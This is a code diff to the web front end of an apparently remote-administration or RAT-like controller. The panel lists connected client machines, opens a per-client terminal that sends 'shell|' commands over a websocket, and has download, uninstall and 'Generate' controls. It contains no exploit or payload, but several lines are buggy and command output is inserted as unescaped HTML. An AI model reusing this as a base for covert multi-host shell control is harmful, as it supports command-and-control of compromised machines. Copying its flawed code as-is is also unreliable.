@@ -9,12 +9,28 @@
     <script src="static/js/bootstrap.js"></script>
     <style>
         .btn {
-            color: blue;
             text-align: center;
             height: 30px;
             width: 100px;
         }
     </style>
+    <script>
+
+        function download(url) {
+
+        }
+        function new_cmd(ip,id) {
+            $("#cmd_list").append(
+                `<div style="text-align: center;" id="`+id+`_show" class="tab-pane fade in active">
+                        <label>
+                            <textarea id="${id}_output" rows="3" style="width: 95%" disabled="disabled"></textarea>
+                        </label>
+
+                    </div>`
+            );
+            $("#myTab").append(`<li class="active"><a href="#${id}_show" data-toggle="tab">${ip}</a></li>`)
+        }
+    </script>
     <script>
         var loc = window.location;
         var uri = 'ws:';
@@ -27,6 +43,7 @@
         ws.onopen = function () {
             ws.send("online");
             console.log("online");
+            $("#log").append("<p style='color:blue'>后端连接成功</p>")
         };
             ws.onmessage = function (evt) {
                 console.log(evt);
@@ -47,7 +64,7 @@
                             <td>`+os+`</td>
                             <td>`+memory+`</td>
                             <td>`+ip+`</td>
-                            <td><a href="cmd.html?`+uuid+`">终端</a> <a href="javascript:void(0);" onclick="download(`+uuid+`)">下载</a> <a href="#">卸载</a></td>
+                            <td><a href="javascript:new_cmd('${iip}','${uuid}');">终端</a> <a href="javascript:void(0);" onclick="download(${uuid});">下载</a> <a href="#">卸载</a></td>
                             `
                     );
                     $("#log").append("<p style='color:green'>客户上线："+iip+"</p>")
@@ -58,6 +75,9 @@
 
                 }else if (flag === "config"){
                     $("#log").append("<p style='color:blue'>Web控制台端口"+msg[1]+" 服务监听端口"+msg[2]+"</p>")
+                }else if (flag === "out"){
+                    let cmd = msg[2];
+                    $(`#${id}_output`).append(cmd);
                 }
 
 
@@ -65,13 +85,18 @@
         ws.onclose = function () {
             ws.send("offline");
             console.log("offline");
+            $("#log").append("<p style='color:red'>后端连接失败</p>")
         };
-    </script>
-    <script>
-        function download(url) {
+        $("#cmd_input").keyup(function(){
 
-        }
+            if(event.keyCode === 13){
+                console.log("enter");
+                ws.send("shell|"+$("#cmd_input").value());
+
+            }
+        });
     </script>
+
 </head>
 <div>
     <div class="page-header">
@@ -80,13 +105,37 @@
     <div id="control" class="text-center">
         <div id="cur_ip"></div>
         <br>
-        <button id="btn_refresh" class="btn">Refresh</button>
-        <button id="btn_Down" class="btn">Download</button>
-        <button id="btn_OpenUrl" class="btn">OpenUrl</button>
-        <button id="btn_del" class="btn">Delete</button>
+        <button id="btn_refresh" type="button" class="btn btn-success">Refresh</button>
+        <button id="btn_Down" type="button" class="btn btn-primary">Download</button>
+        <button id="btn_OpenUrl" type="button" class="btn btn-primary">OpenUrl</button>
+        <button id="btn_del" type="button" class="btn btn-danger">Delete</button>
+        <button id="btn_del" type="button" class="btn btn-info" data-toggle="modal" data-target="#myModal">Generate</button>
     </div>
     <br>
-    <div>
+    <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+                    <h4 class="modal-title" id="myModalLabel">远程终端</h4>
+                </div>
+                <div class="modal-body" style="text-align: center;">
+                    <div>
+                        <label>
+                            <textarea class="form-control" rows="3" style="width: 80%"></textarea>
+                        </label>
+                    </div>
+
+
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-default" data-dismiss="modal">关闭</button>
+                    <button type="button" class="btn btn-primary">提交更改</button>
+                </div>
+            </div><!-- /.modal-content -->
+        </div><!-- /.modal -->
+    </div>
+    <div >
         <table id="server_list" border="1" width="80%" style="margin-left: 10%;margin-right: 10%;text-align: center">
             <tr id="title">
                 <td></td>
@@ -108,12 +157,24 @@
             </tr>-->
         </table>
     </div>
-    <div id="div_log" style="margin-left:10%;margin-right:11%;text-align:left;margin-top: 50px;">
+    <div id="div_log" width="80%" style="margin-left:10%;margin-right:11%;text-align:left;margin-top: 50px;max-height: 20%">
         <h2>日志</h2>
         <div id="log" style="border-style:solid; border-width:1px; border-color:#000;">
-
         </div>
     </div>
+    <div id="title_bar" width="80%" style="margin-left:10%;margin-right:11%;text-align:center;margin-top: 50px;max-height: 20%">
+        <ul id="myTab" class="nav nav-tabs">
+
+        </ul>
+        <div id="cmd_list" class="tab-content">
+
+        </div>
+
+        <label>
+            <input id="cmd_input" type="text" class="form-control" style="width: 95%">
+        </label>
+    </div>
+
 </div>
 
 <body>
